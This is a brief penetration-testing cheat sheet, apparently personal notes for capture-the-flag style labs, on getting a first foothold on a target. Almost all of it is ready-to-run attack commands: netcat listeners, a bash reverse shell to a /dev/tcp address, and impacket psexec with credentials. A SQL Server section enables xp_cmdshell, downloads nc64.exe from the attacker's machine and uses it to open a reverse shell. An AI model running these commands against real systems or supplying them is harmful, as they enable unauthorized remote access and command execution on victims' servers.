Foothold
========

Listeners
---------

Netcat
```
sudo nc -lvnp $LPORT
```

Netcat on a port less likely to be blocked by egress firewalls
```
sudo nc -lvnp 443
```

Reverse Shells
--------------

[Various Reverse Shell Cheatsheets (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
```
bash -c "bash -i >& /dev/tcp/10.10.14.62/443 0>&1"
```

use python to improve the quality of terminal experience
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
or 
```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Protocol attacks with [impacket](https://github.com/SecureAuthCorp/impacke)
```
impacket-psexec "./$WINUSER:$WINPASS"@$RIP
```

SQL Server
----------

check if role is admin
```
SELECT is_srvrolemember('sysadmin');
```

Enable command shell
```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; - Enabling the sp_configure as stated in the above error message EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Run a command
```
EXEC xp_cmdshell 'net user';
```
	
Download and run nc64.exe
```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://[[$LIP]]:8080/nc64.exe -outfile nc64.exe"
```
	
Obtain reverse shell
```
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe [[$LIP]] [[$LPORT]]"
```

Estabish SSH tunnel (local port: `8888`, remote host: `localhost`, remote port: `80`)
```
ssh -L 8888:localhost:80 -i ~/.ssh/id_trash_ed25519 $RUSER@$RIP
```